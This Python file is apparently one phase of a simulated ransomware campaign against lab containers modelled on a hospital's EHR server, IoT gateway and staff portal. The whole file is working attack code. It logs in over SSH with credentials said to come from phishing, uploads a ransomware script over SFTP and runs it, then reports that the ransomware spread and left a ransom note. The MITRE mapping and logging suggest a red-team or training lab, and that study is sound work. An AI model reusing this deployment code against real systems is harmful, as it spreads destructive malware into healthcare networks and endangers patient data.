#!/usr/bin/env python3
"""Phase 2 — Deploy ransomware payload via SSH/SFTP.

Adapted from 03_deploy.py.  Uses paramiko to upload and execute the
ransomware on the initial foothold (EHR container) using credentials
harvested in Phase 0 (phishing).
Maps to MITRE T1021.004 (Remote Services: SSH), T1059.006 (Python).
"""

import os

import paramiko

from utils.logger import AttackLogger

TARGET_PORT = 2222


class Phase2Deploy:
    """Upload and execute the ransomware payload on the EHR container."""

    PHASE_NAME = "phase2_deploy"

    def __init__(self, target_ip: str, username: str, password: str,
                 logger: AttackLogger, port: int = TARGET_PORT):
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.port = port
        self.logger = logger

    def run(self) -> dict:
        print(f"\n--- Phase 2: Deploy to EHR container "
              f"({self.target_ip}:{self.port}) ---\n")

        script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        payload_path = os.path.join(script_dir, "phases", "phase3_ransomware.py")

        if not os.path.isfile(payload_path):
            msg = f"[!] Payload not found at: {payload_path}"
            print(msg)
            self.logger.log(self.PHASE_NAME, "payload_missing",
                            {"path": payload_path}, success=False)
            return {"success": False, "error": msg}

        self.logger.log(self.PHASE_NAME, "ssh_connect",
                        {"target": self.target_ip, "port": self.port,
                         "username": self.username})

        print(f"[*] Connecting to {self.target_ip}:{self.port} via SSH...")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(self.target_ip, port=self.port,
                           username=self.username, password=self.password,
                           timeout=10)
        except paramiko.AuthenticationException:
            msg = "[!] Auth failed — check credentials"
            print(msg)
            self.logger.log(self.PHASE_NAME, "auth_failed", success=False)
            return {"success": False, "error": msg}
        except Exception as e:
            msg = f"[!] Connection failed: {e}"
            print(msg)
            self.logger.log(self.PHASE_NAME, "connection_failed",
                            {"error": str(e)}, success=False)
            return {"success": False, "error": msg}

        print("[*] Connected. Uploading payload...")
        sftp = client.open_sftp()
        sftp.put(payload_path, "/tmp/ransomware.py")
        sftp.close()

        self.logger.log(self.PHASE_NAME, "payload_uploaded",
                        {"remote_path": "/tmp/ransomware.py"})

        print("[*] Running payload on EHR server (propagation will follow)...\n")
        _stdin, stdout, stderr = client.exec_command("python3 /tmp/ransomware.py")

        out_lines: list[str] = []
        for line in stdout:
            stripped = line.strip()
            print(stripped)
            out_lines.append(stripped)

        err = stderr.read().decode().strip()
        if err:
            print(f"[!] stderr: {err}")

        client.close()

        print(f"\n[*] Deployment complete.")
        print(f"[*] The ransomware propagated from ehr-server "
              f"to iot-gateway and staff-portal.")
        print(f"\n[*] Verify on each container:")
        print(f"    ssh -p 2222 {self.username}@{self.target_ip}  # EHR server")
        print(f"    ssh -p 2223 {self.username}@{self.target_ip}  # IoT gateway")
        print(f"    ssh -p 2224 {self.username}@{self.target_ip}  # Staff portal")
        print(f"    ls /opt/hospital-data/")
        print(f"    cat /opt/hospital-data/RANSOM_NOTE.txt")

        self.logger.log(self.PHASE_NAME, "deployment_complete",
                        {"remote_output_lines": len(out_lines)})

        return {"success": True, "output_lines": len(out_lines)}
